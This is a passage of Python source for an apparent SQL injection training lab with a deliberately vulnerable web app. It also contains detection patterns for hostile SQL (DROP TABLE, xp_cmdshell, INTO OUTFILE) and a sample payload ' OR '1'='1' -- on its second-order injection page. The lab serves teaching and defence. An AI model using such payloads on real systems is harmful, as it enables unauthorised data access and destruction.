            # ================================================================
            story.append(PageBreak())
            story.append(Paragraph("7. Summary and Key Takeaways", heading_style))
            
            takeaways = [
                "- <b>SQL injection remains critical</b> - OWASP Top 10 #1",
                "- <b>Modern attackers use advanced techniques</b> - WAF bypass, out-of-band, second-order",
                "- <b>Detection requires layered approach</b> - WAF, logs, network monitoring",
                "- <b>Prevention is multi-faceted</b> - Parameterized queries, input validation, least privilege",
                "- <b>Continuous learning is essential</b> - Regular testing and training",
                "- <b>MITRE ATT&CK provides context</b> - Understand adversary TTPs"
            ]
            
            for takeaway in takeaways:
                story.append(Paragraph(takeaway, body_style))
            story.append(Spacer(1, 20))
            
            # ================================================================
            # FOOTER
            # ================================================================
            story.append(Spacer(1, 30))
            
            contact_style = ParagraphStyle(
                'Contact',
                parent=styles['Normal'],
                fontSize=10,
                textColor=colors.HexColor('#004d99'),
                alignment=TA_CENTER,
                spaceAfter=4
            )
            
            story.append(Paragraph("-" * 80, footer_style))
            story.append(Spacer(1, 10))
            story.append(Paragraph(
                "<b>For more information, please contact:</b>",
                contact_style
            ))
            story.append(Paragraph(
                "Stark Expo Tech Exchange Support Team",
                contact_style
            ))
            story.append(Paragraph(
                "Email: <b>starkec.team@outlook.com</b>",
                contact_style
            ))
            story.append(Paragraph(
                "Email: <b>info@starkteamsupport.mw</b>",
                contact_style
            ))
            story.append(Paragraph(
                "Website: Stark Expo Tech Exchange",
                contact_style
            ))
            story.append(Spacer(1, 10))
            story.append(Paragraph("-" * 80, footer_style))
            story.append(Spacer(1, 6))
            story.append(Paragraph(
                "(c) 2024 DSTERMINAL v4.0 | Advanced SQL Injection Learning Notes | All Rights Reserved",
                footer_style
            ))
            story.append(Paragraph(
                "This document is for educational purposes only. Use responsibly.",
                footer_style
            ))
            
            # ================================================================
            # BUILD PDF WITH WATERMARK
            # ================================================================
            doc.build(story, onFirstPage=add_watermark, onLaterPages=add_watermark)
            
            if self.console:
                self.console.print(f"[green]Advanced PDF Notes generated: {filename}[/green]")
            
            return filename
            
        except Exception as e:
            if self.console:
                self.console.print(f"[red]PDF generation failed: {str(e)}[/red]")
            return None
 
# ============================================================
# ENHANCED SQL INJECTION LAB
# ============================================================

class EnhancedSQLInjectionLab:
    """
    Enhanced SQL Injection Learning Lab with advanced techniques
    """
    
    def __init__(self, console=None):
        self.console = console or Console() if RICH_AVAILABLE else None
        self.db_path = os.path.expanduser("~/DSTerminal_Workspace/advanced_lab.db")
        self.server = None
        self.server_thread = None
        self.port = 8080
        self.running = False
        self.secure_mode = False
        self.waf_mode = False
        self.current_credentials = {
            'username': 'admin',
            'password': 'admin123'
        }
        self.session_log = []
        self.user_products = {}
        self.show_learning = False
        self.detected_techniques = set()
        self.injection_attempts = []
        self.waf_alerts = []
        self.second_order_payloads = []
        self.pdf_generator = EnhancedPDFNotesGenerator(console)
        
        # Initialize database with advanced schema
        self._init_advanced_database()
    
    def _init_advanced_database(self):
        """Initialize advanced SQLite database with more complex schema"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Users table with more fields
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    role TEXT DEFAULT 'user',
                    email TEXT,
                    phone TEXT,
                    department TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_login TIMESTAMP,
                    is_active INTEGER DEFAULT 1,
                    profile_data TEXT,
                    security_question TEXT,
                    security_answer TEXT
                )
            ''')
            
            # Products table with more details
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS products (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    name TEXT NOT NULL,
                    price REAL,
                    description TEXT,
                    stock INTEGER DEFAULT 0,
                    category TEXT,
                    sub_category TEXT,
                    is_featured INTEGER DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # Orders table with more fields
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS orders (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    product_id INTEGER,
                    quantity INTEGER,
                    total REAL,
                    status TEXT DEFAULT 'pending',
                    shipping_address TEXT,
                    payment_method TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id),
                    FOREIGN KEY (product_id) REFERENCES products (id)
                )
            ''')
            
            # Audit logs with more detail
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS audit_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT,
                    action TEXT,
                    ip TEXT,
                    user_agent TEXT,
                    request_data TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Injection attempts with more metadata
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS injection_attempts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    technique TEXT,
                    payload TEXT,
                    username TEXT,
                    success INTEGER DEFAULT 0,
                    waf_blocked INTEGER DEFAULT 0,
                    response_time REAL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Stored payloads for second-order injection
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS stored_payloads (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    payload TEXT,
                    username TEXT,
                    executed INTEGER DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Insert sample users
            cursor.execute("SELECT COUNT(*) FROM users")
            if cursor.fetchone()[0] == 0:
                sample_users = [
                    ('admin', 'admin123', 'administrator', 'admin@lab.local', '+1-555-0001', 'IT Security', None, 'What is your pet\'s name?', 'Fluffy'),
                    ('john_doe', 'john2024!', 'user', 'john@example.com', '+1-555-0002', 'Sales', None, 'Where were you born?', 'New York'),
                    ('jane_smith', 'jane@456#', 'user', 'jane@example.com', '+1-555-0003', 'Marketing', None, 'What is your mother\'s maiden name?', 'Smith'),
                    ('bob_wilson', 'bob$wilson789', 'user', 'bob@example.com', '+1-555-0004', 'Engineering', None, 'What is your favorite color?', 'Blue'),
                    ('alice_brown', 'alice!brown#2024', 'user', 'alice@example.com', '+1-555-0005', 'HR', None, 'What is your pet\'s name?', 'Whiskers'),
                    ('charlie_davis', 'charlie@davis#321', 'user', 'charlie@example.com', '+1-555-0006', 'Finance', None, 'Where did you go to school?', 'MIT'),
                    ('emma_jones', 'emma$jones#654', 'user', 'emma@example.com', '+1-555-0007', 'Operations', None, 'What is your favorite book?', '1984'),
                    ('mike_taylor', 'mike@taylor#987', 'user', 'mike@example.com', '+1-555-0008', 'Support', None, 'What is your pet\'s name?', 'Rex'),
                    ('sarah_wilson', 'sarah@wilson#123', 'user', 'sarah@example.com', '+1-555-0009', 'Design', None, 'What is your favorite color?', 'Purple'),
                    ('david_clark', 'david@clark#456', 'user', 'david@example.com', '+1-555-0010', 'Development', None, 'Where were you born?', 'London')
                ]
                cursor.executemany(
                    "INSERT INTO users (username, password, role, email, phone, department, profile_data, security_question, security_answer) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    sample_users
                )
            
            # Insert sample products
            cursor.execute("SELECT COUNT(*) FROM products")
            if cursor.fetchone()[0] == 0:
                cursor.execute("SELECT id FROM users")
                user_ids = [row[0] for row in cursor.fetchall()]
                
                product_templates = [
                    ('Laptop Pro X', 1299.99, 'High-performance laptop with 16GB RAM, 512GB SSD', 'Electronics', 'Computers'),
                    ('Smartphone Z', 799.99, 'Latest 5G smartphone with 128GB storage, 6.5" display', 'Electronics', 'Mobile'),
                    ('Wireless Headphones', 149.99, 'Noise-cancelling bluetooth headphones with 30hr battery', 'Audio', 'Headphones'),
                    ('Smart Watch', 299.99, 'Fitness tracking with heart rate monitor and GPS', 'Wearables', 'Smartwatches'),
                    ('USB-C Hub', 59.99, '7-in-1 USB-C hub with HDMI, Ethernet, and SD card reader', 'Accessories', 'Hubs'),
                    ('Gaming Mouse', 79.99, 'RGB gaming mouse with 6 programmable buttons and 16000 DPI', 'Gaming', 'Peripherals'),
                    ('Mechanical Keyboard', 129.99, 'RGB mechanical keyboard with blue switches and N-key rollover', 'Gaming', 'Peripherals'),
                    ('External SSD', 199.99, '1TB portable SSD with USB 3.2 and 1050MB/s read speed', 'Storage', 'SSD'),
                    ('Webcam HD', 89.99, '1080p HD webcam with microphone and autofocus', 'Accessories', 'Cameras'),
                    ('Wireless Charger', 39.99, 'Fast wireless charging pad with LED indicator', 'Accessories', 'Chargers'),
                    ('Tablet Pro', 599.99, '10.5" tablet with 256GB storage and cellular connectivity', 'Electronics', 'Tablets'),
                    ('Bluetooth Speaker', 79.99, 'Portable bluetooth speaker with waterproof design', 'Audio', 'Speakers')
                ]
                
                for user_id in user_ids:
                    num_products = random.randint(3, 6)
                    selected = random.sample(product_templates, min(num_products, len(product_templates)))
                    for product in selected:
                        stock = random.randint(5, 50)
                        is_featured = random.choice([0, 1])
                        cursor.execute(
                            "INSERT INTO products (user_id, name, price, description, stock, category, sub_category, is_featured) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                            (user_id, product[0], product[1], product[2], stock, product[3], product[4], is_featured)
                        )
            
            conn.commit()
            conn.close()
            
            if self.console:
                self.console.print("[green]Advanced SQL Injection Lab database initialized[/green]")
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Database initialization error: {e}[/red]")
    
    def _get_db_connection(self):
        try:
            return sqlite3.connect(self.db_path)
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Database connection error: {e}[/red]")
            return None
    
    def set_secure_mode(self, enabled: bool):
        self.secure_mode = enabled
        if self.console:
            status = "[green]ENABLED[/green]" if enabled else "[red]DISABLED[/red]"
            self.console.print(f"[yellow]Secure mode: {status}[/yellow]")
    
    def set_waf_mode(self, enabled: bool):
        self.waf_mode = enabled
        if self.console:
            status = "[green]ENABLED[/green]" if enabled else "[red]DISABLED[/red]"
            self.console.print(f"[yellow]WAF mode: {status}[/yellow]")
    
    def toggle_learning(self):
        self.show_learning = not self.show_learning
        return self.show_learning
    
    def add_audit_log(self, username: str, action: str, ip: str = "127.0.0.1", user_agent: str = "", request_data: str = ""):
        try:
            conn = self._get_db_connection()
            if not conn:
                return
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO audit_logs (username, action, ip, user_agent, request_data) VALUES (?, ?, ?, ?, ?)",
                (username, action, ip, user_agent, request_data)
            )
            conn.commit()
            conn.close()
        except:
            pass
    
    def log_injection_attempt(self, technique: str, payload: str, username: str, success: bool = False, waf_blocked: bool = False, response_time: float = 0.0):
        try:
            conn = self._get_db_connection()
            if not conn:
                return
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO injection_attempts (technique, payload, username, success, waf_blocked, response_time) VALUES (?, ?, ?, ?, ?, ?)",
                (technique, payload, username, 1 if success else 0, 1 if waf_blocked else 0, response_time)
            )
            conn.commit()
            conn.close()
            self.injection_attempts.append({
                'technique': technique,
                'payload': payload,
                'username': username,
                'success': success,
                'waf_blocked': waf_blocked,
                'response_time': response_time,
                'timestamp': datetime.now()
            })
            if success:
                self.detected_techniques.add(technique)
        except:
            pass
    
    def store_second_order_payload(self, payload: str, username: str):
        try:
            conn = self._get_db_connection()
            if not conn:
                return
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO stored_payloads (payload, username) VALUES (?, ?)",
                (payload, username)
            )
            conn.commit()
            conn.close()
            self.second_order_payloads.append({
                'payload': payload,
                'username': username,
                'executed': False,
                'created_at': datetime.now()
            })
        except:
            pass
    
    def get_injection_attempts(self, limit: int = 50) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT technique, payload, username, success, waf_blocked, response_time, timestamp FROM injection_attempts ORDER BY id DESC LIMIT ?",
                (limit,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'technique': r[0], 'payload': r[1], 'username': r[2], 
                 'success': r[3], 'waf_blocked': r[4], 'response_time': r[5], 'timestamp': r[6]}
                for r in rows
            ]
        except:
            return []
    
    def get_users(self) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute("SELECT id, username, role, email, phone, department, created_at, last_login, is_active FROM users")
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'username': r[1], 'role': r[2], 'email': r[3], 
                 'phone': r[4], 'department': r[5], 'created_at': r[6], 
                 'last_login': r[7], 'is_active': r[8]}
                for r in rows
            ]
        except:
            return []
    
    def get_user_by_username(self, username: str) -> Optional[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return None
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, password, role, email, phone, department, profile_data FROM users WHERE username = ?",
                (username,)
            )
            row = cursor.fetchone()
            conn.close()
            if row:
                return {
                    'id': row[0], 'username': row[1], 'password': row[2],
                    'role': row[3], 'email': row[4], 'phone': row[5],
                    'department': row[6], 'profile_data': row[7]
                }
            return None
        except:
            return None
    
    def authenticate_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return None
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, role, email, phone, department FROM users WHERE username = ? AND password = ? AND is_active = 1",
                (username, password)
            )
            row = cursor.fetchone()
            conn.close()
            if row:
                self._update_last_login(row[0])
                return {
                    'id': row[0], 'username': row[1], 'role': row[2],
                    'email': row[3], 'phone': row[4], 'department': row[5]
                }
            return None
        except:
            return None
    
    def _update_last_login(self, user_id: int):
        try:
            conn = self._get_db_connection()
            if not conn:
                return
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?",
                (user_id,)
            )
            conn.commit()
            conn.close()
        except:
            pass
    
    def get_user_products(self, user_id: int) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, name, price, description, stock, category, sub_category, is_featured, created_at FROM products WHERE user_id = ?",
                (user_id,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'name': r[1], 'price': r[2], 'description': r[3], 
                 'stock': r[4], 'category': r[5], 'sub_category': r[6], 
                 'is_featured': r[7], 'created_at': r[8]}
                for r in rows
            ]
        except:
            return []
    
    def get_user_orders(self, user_id: int) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, product_id, quantity, total, status, shipping_address, payment_method, created_at FROM orders WHERE user_id = ?",
                (user_id,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'product_id': r[1], 'quantity': r[2], 
                 'total': r[3], 'status': r[4], 'shipping_address': r[5],
                 'payment_method': r[6], 'created_at': r[7]}
                for r in rows
            ]
        except:
            return []
    
    def get_all_products(self) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute("""
                SELECT p.id, p.name, p.price, p.description, p.stock, p.category, p.sub_category, p.is_featured, u.username as owner
                FROM products p
                JOIN users u ON p.user_id = u.id
            """)
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'name': r[1], 'price': r[2], 'description': r[3], 
                 'stock': r[4], 'category': r[5], 'sub_category': r[6], 
                 'is_featured': r[7], 'owner': r[8]}
                for r in rows
            ]
        except:
            return []
    
    def get_audit_logs(self, limit: int = 50) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT username, action, ip, user_agent, request_data, timestamp FROM audit_logs ORDER BY id DESC LIMIT ?",
                (limit,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'username': r[0], 'action': r[1], 'ip': r[2], 
                 'user_agent': r[3], 'request_data': r[4], 'timestamp': r[5]}
                for r in rows
            ]
        except:
            return []
    
    def update_credentials(self, username: str, password: str) -> bool:
        try:
            conn = self._get_db_connection()
            if not conn:
                return False
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET password = ? WHERE username = ?",
                (password, username)
            )
            conn.commit()
            conn.close()
            self.current_credentials = {'username': username, 'password': password}
            return True
        except:
            return False
    
    def reset_database(self):
        try:
            if os.path.exists(self.db_path):
                os.remove(self.db_path)
            self._init_advanced_database()
            self.current_credentials = {'username': 'admin', 'password': 'admin123'}
            self.detected_techniques = set()
            self.injection_attempts = []
            self.second_order_payloads = []
            if self.console:
                self.console.print("[green]Advanced database reset to initial state[/green]")
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Reset failed: {e}[/red]")
    
    def generate_pdf_notes(self) -> Optional[str]:
        """Generate enhanced PDF notes"""
        return self.pdf_generator.generate_notes(include_techniques=True, include_waf=True)
    
    def detect_technique(self, payload: str) -> str:
        """Detect which SQL injection technique is being used with advanced patterns"""
        payload_upper = payload.upper()
        
        # Check for advanced patterns first
        if 'LOAD_FILE' in payload_upper and 'CONCAT' in payload_upper:
            return 'out_of_band'
        elif 'INTO OUTFILE' in payload_upper or 'INTO DUMPFILE' in payload_upper:
            return 'out_of_band'
        elif 'UNION SELECT' in payload_upper:
            return 'union_based'
        elif 'AND SLEEP(' in payload_upper or 'WAITFOR DELAY' in payload_upper:
            return 'time_based'
        elif 'BENCHMARK(' in payload_upper:
            return 'time_based'
        elif 'CONVERT(INT,' in payload_upper or 'CAST((' in payload_upper:
            return 'error_based'
        elif 'DROP TABLE' in payload_upper or 'DELETE FROM' in payload_upper:
            return 'stacked_queries'
        elif 'UPDATE ' in payload_upper and 'SET' in payload_upper:
            return 'stacked_queries'
        elif 'INSERT INTO' in payload_upper:
            return 'stacked_queries'
        elif 'CREATE TABLE' in payload_upper or 'ALTER TABLE' in payload_upper:
            return 'stacked_queries'
        elif 'TRUNCATE TABLE' in payload_upper:
            return 'stacked_queries'
        elif 'EXEC XP_CMDSHELL' in payload_upper:
            return 'stacked_queries'
        elif ' AND ' in payload_upper and ('1=1' in payload or '1=2' in payload):
            return 'boolean_based'
        elif 'OR ' in payload_upper and ('=' in payload or "'" in payload):
            return 'basic'
        elif 'AND ' in payload_upper and '=' in payload:
            return 'boolean_based'
        else:
            return 'basic'
    
    def detect_waf_bypass(self, payload: str) -> List[str]:
        """Detect WAF bypass techniques in payload"""
        bypass_techniques = []
        
        # Check for comment obfuscation
        if '/**/' in payload or '/*!' in payload or '-- -' in payload:
            bypass_techniques.append('comment_obfuscation')
        
        # Check for encoding evasion
        if '%' in payload or '\\x' in payload:
            bypass_techniques.append('encoding_evasion')
        
        # Check for case manipulation
        if any(c.isupper() for c in payload) and any(c.islower() for c in payload):
            if any(keyword in payload.upper() for keyword in ['OR', 'AND', 'UNION', 'SELECT', 'FROM']):
                bypass_techniques.append('case_manipulation')
        
        # Check for null byte
        if '%00' in payload or '\x00' in payload:
            bypass_techniques.append('null_byte_injection')
        
        # Check for buffer overflow (large payload)
        if len(payload) > 1000:
            bypass_techniques.append('buffer_overflow')
        
        return bypass_techniques


# ============================================================
# ENHANCED HTTP REQUEST HANDLER - COMPLETE IMPLEMENTATION
# ============================================================

class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
    """Enhanced HTTP handler for the SQL Injection Learning Lab"""
    
    lab_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        try:
            parsed = urlparse(self.path)
            path = parsed.path
            query_params = parse_qs(parsed.query)
            
            if path == '/' or path == '/login':
                self._serve_login_form()
            elif path == '/dashboard':
                self._serve_dashboard(query_params)
            elif path == '/logout':
                self._serve_logout()
            elif path == '/products':
                self._serve_products(query_params)
            elif path == '/users':
                self._serve_users(query_params)
            elif path == '/logs':
                self._serve_logs()
            elif path == '/styles.css':
                self._serve_css()
            elif path == '/reset':
                self._serve_reset()
            elif path == '/all-products':
                self._serve_all_products()
            elif path == '/toggle-learning':
                self._toggle_learning()
            elif path == '/injection-history':
                self._serve_injection_history()
            elif path == '/techniques':
                self._serve_techniques()
            elif path == '/download-pdf':
                self._serve_pdf_download()
            elif path == '/secure_login':
                self._handle_secure_login(query_params)
            elif path == '/waf-toggle':
                self._handle_waf_toggle(query_params)
            elif path == '/second-order':
                self._serve_second_order()
            else:
                self._send_error(404, "Page not found")
        except Exception as e:
            self._send_error(500, f"Server error: {str(e)}")
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = parse_qs(post_data)
            
            parsed = urlparse(self.path)
            path = parsed.path
            
            if path == '/login':
                self._handle_login(params)
            elif path == '/update_credentials':
                self._handle_update_credentials(params)
            elif path == '/secure_login':
                self._handle_secure_login(params)
            elif path == '/test_injection':
                self._handle_test_injection(params)
            elif path == '/store_payload':
                self._handle_store_payload(params)
            else:
                self._send_error(404, "Page not found")
        except Exception as e:
            self._send_error(500, f"Server error: {str(e)}")
    
    def _send_html(self, html: str, status: int = 200):
        try:
            self.send_response(status)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        except:
            pass
    
    def _send_error(self, code: int, message: str):
        html = f"""
        <html><body style="font-family: Arial; background: #0d1117; color: #c9d1d9; padding: 40px;">
            <h1 style="color: #ff5555;">Error {code}</h1>
            <p>{message}</p>
            <a href="/login" style="color: #00ffff;">Go to Login</a>
        </body></html>
        """
        self._send_html(html, code)
    
    def _serve_pdf_download(self):
        """Serve enhanced PDF download"""
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        pdf_path = lab.generate_pdf_notes()
        
        if pdf_path and os.path.exists(pdf_path):
            try:
                with open(pdf_path, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'attachment; filename="advanced_sql_injection_notes_{datetime.now().strftime("%Y%m%d")}.pdf"')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            except Exception as e:
                self._send_error(500, f"Error serving PDF: {e}")
        else:
            self._send_error(500, "PDF generation failed. Please check that ReportLab is installed.")
            
    def _toggle_learning(self):
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        # Toggle the learning state
        lab.show_learning = not lab.show_learning
        
        # Add audit log
        action = "Learning Center shown" if lab.show_learning else "Learning Center hidden"
        lab.add_audit_log('system', action)
        
        # Redirect back to login page with state preserved
        self.send_response(302)
        self.send_header('Location', '/login')
        self.end_headers()
    
    def _handle_waf_toggle(self, params):
        mode = params.get('mode', [''])[0]
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        if mode == 'enable':
            lab.set_waf_mode(True)
            lab.add_audit_log('admin', 'WAF mode enabled')
        elif mode == 'disable':
            lab.set_waf_mode(False)
            lab.add_audit_log('admin', 'WAF mode disabled')
        
        self.send_response(302)
        self.send_header('Location', '/dashboard')
        self.end_headers()
    
    def _serve_second_order(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        # Get current user
        username = 'admin'
        for cookie in cookies.split(';'):
            if 'username=' in cookie:
                username = cookie.split('=')[1].strip()
                break
        
        user = lab.get_user_by_username(username)
        if not user:
            self._send_error(401, "User not found")
            return
        
        # Get stored payloads
        stored_payloads = lab.second_order_payloads
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Second-Order SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
            <style>
                .second-order-container {{ padding: 20px; }}
                .payload-form {{
                    background: #161b22;
                    padding: 20px;
                    border-radius: 10px;
                    border: 1px solid #30363d;
                    margin-bottom: 30px;
                }}
                .payload-form textarea {{
                    width: 100%%;
                    padding: 10px;
                    background: #0d1117;
                    border: 1px solid #30363d;
                    border-radius: 5px;
                    color: #c9d1d9;
                    font-family: 'Consolas', monospace;
                    font-size: 14px;
                    min-height: 100px;
                    resize: vertical;
                }}
                .payload-form textarea:focus {{
                    outline: none;
                    border-color: #00ffff;
                }}
                .payload-list {{
                    background: #161b22;
                    border-radius: 10px;
                    border: 1px solid #30363d;
                    overflow: hidden;
                }}
                .payload-list table {{
                    width: 100%%;
                    border-collapse: collapse;
                }}
                .payload-list th {{
                    background: #21262d;
                    padding: 12px;
                    text-align: left;
                    color: #00ffff;
                    border-bottom: 2px solid #30363d;
                }}
                .payload-list td {{
                    padding: 12px;
                    border-bottom: 1px solid #1a1a2e;
                    vertical-align: middle;
                }}
                .payload-list tr:hover {{
                    background: #1a1a2e;
                }}
                .payload-status {{
                    display: inline-block;
                    padding: 2px 12px;
                    border-radius: 12px;
                    font-size: 12px;
                    font-weight: bold;
                }}
                .status-pending {{
                    background: #ffcc0044;
                    color: #ffcc00;
                }}
                .status-executed {{
                    background: #00ff8844;
                    color: #00ff88;
                }}
                .execute-btn {{
                    padding: 5px 15px;
                    background: #ff8800;
                    color: #0d1117;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 12px;
                    transition: all 0.3s;
                }}
                .execute-btn:hover {{
                    transform: scale(1.05);
                    box-shadow: 0 0 15px rgba(255, 136, 0, 0.3);
                }}
                .execute-btn:disabled {{
                    opacity: 0.5;
                    cursor: not-allowed;
                }}
                .info-box {{
                    background: #0d1117;
                    padding: 15px;
                    border-radius: 8px;
                    border-left: 3px solid #ffcc00;
                    margin-bottom: 20px;
                }}
                .info-box h4 {{
                    color: #ffcc00;
                    margin-bottom: 10px;
                }}
                .info-box p {{
                    color: #c9d1d9;
                    font-size: 14px;
                    line-height: 1.6;
                }}
                .info-box code {{
                    background: #1a1a2e;
                    padding: 2px 8px;
                    border-radius: 3px;
                    color: #ffcc00;
                    font-size: 13px;
                }}
                .example-payloads {{
                    display: flex;
                    gap: 10px;
                    flex-wrap: wrap;
                    margin-top: 10px;
                }}
                .example-payload-btn {{
                    padding: 5px 15px;
                    background: #21262d;
                    color: #c9d1d9;
                    border: 1px solid #30363d;
                    border-radius: 5px;
                    cursor: pointer;
                    font-family: 'Consolas', monospace;
                    font-size: 12px;
                    transition: all 0.3s;
                }}
                .example-payload-btn:hover {{
                    border-color: #00ffff;
                    color: #00ffff;
                }}
                .result-box {{
                    margin-top: 20px;
                    padding: 15px;
                    background: #0d1117;
                    border-radius: 8px;
                    border: 1px solid #30363d;
                    display: none;
                }}
                .result-box.success {{
                    border-color: #00ff88;
                    display: block;
                }}
                .result-box.error {{
                    border-color: #ff5555;
                    display: block;
                }}
                .result-box h4 {{
                    margin-bottom: 10px;
                }}
                .result-box.success h4 {{
                    color: #00ff88;
                }}
                .result-box.error h4 {{
                    color: #ff5555;
                }}
                .result-box code {{
                    display: block;
                    padding: 10px;
                    background: #1a1a2e;
                    border-radius: 5px;
                    color: #ffcc00;
                    font-size: 13px;
                    margin-top: 10px;
                    overflow-x: auto;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Second-Order SQL Injection Lab</h1>
                    <p class="subtitle">Learn how stored payloads can be executed later</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/second-order" class="active">Second-Order</a>
                    <a href="/techniques">Techniques</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="second-order-container">
                    <div class="info-box">
                        <h4>What is Second-Order SQL Injection?</h4>
                        <p>
                            Second-order SQL injection occurs when malicious input is <strong>stored</strong> in the database 
                            and then <strong>executed later</strong> when the stored data is used in a vulnerable query. 
                            This makes it harder to detect because the payload appears legitimate when first submitted.
                        </p>
                        <p style="margin-top:10px;">
                            <strong>How it works:</strong>
                            <ol style="padding-left:20px;color:#c9d1d9;margin-top:5px;">
                                <li>You submit a payload that gets <strong>stored</strong> in the database</li>
                                <li>The payload appears to be safe (no immediate injection)</li>
                                <li>Later, the stored data is <strong>retrieved and used</strong> in a query</li>
                                <li>The payload executes, causing the injection</li>
                            </ol>
                        </p>
                        <div style="margin-top:10px;">
                            <strong>Example:</strong>
                            <code style="display:block;padding:10px;background:#1a1a2e;border-radius:5px;margin-top:5px;color:#ffcc00;">
                                Step 1: Submit: ' OR '1'='1' -- (Stored in database)<br>
                                Step 2: Later, application runs: SELECT * FROM users WHERE username = '[STORED_PAYLOAD]'<br>
                                Step 3: Injection executes!
                            </code>
                        </div>
                    </div>
                    
                    <div class="payload-form">
                        <h3 style="color:#00ffff;margin-bottom:15px;">Store a Payload</h3>
                        <p style="color:#888;margin-bottom:10px;">Enter a SQL injection payload to store in the database for later execution.</p>
                        
                        <form method="POST" action="/store_payload" id="payloadForm">
                            <textarea name="payload" placeholder="Enter your SQL injection payload here... Example: ' OR '1'='1' --" required></textarea>
                            
                            <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
                                <button type="submit" style="width:auto;padding:10px 30px;background:linear-gradient(135deg,#00ff88,#00cc66);">
                                    Store Payload
                                </button>
                                
                                <span style="color:#888;font-size:13px;">or try one of these examples:</span>
